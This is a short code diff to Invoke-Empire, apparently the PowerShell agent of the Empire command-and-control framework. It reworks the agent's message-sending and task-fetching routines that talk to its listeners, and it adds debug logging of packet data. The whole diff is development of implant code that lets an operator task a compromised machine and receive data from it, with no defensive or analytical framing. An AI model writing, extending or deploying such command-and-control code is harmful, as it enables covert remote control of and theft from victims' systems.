@@ -780,20 +780,21 @@ function Invoke-Empire {
 	}
 	# send message function iterating through listeners
 	$script:SendMessage = {
-		param($Listener, $PacketData)
+		param($Listener, $Packets)
         "called send message" | Out-File "out.log" -Append -NoClobber
         $PacketData | Out-File "out.log" -Append -NoClobber
+        (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
 	}
 
 	$script:GetTask = {
 		param($Listener)
 
-		$TaskData = (& $l['get_task_func'])
+		$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
 		if (!$TaskData){
-			$l['missedCheckins'] += 1
+			$Listener['missedCheckins'] += 1
 		}
 		else {
-			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $l['defaultResponse']) {
+			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
 				Decode-RoutingPacket -PacketData $TaskData
 			}
 		}
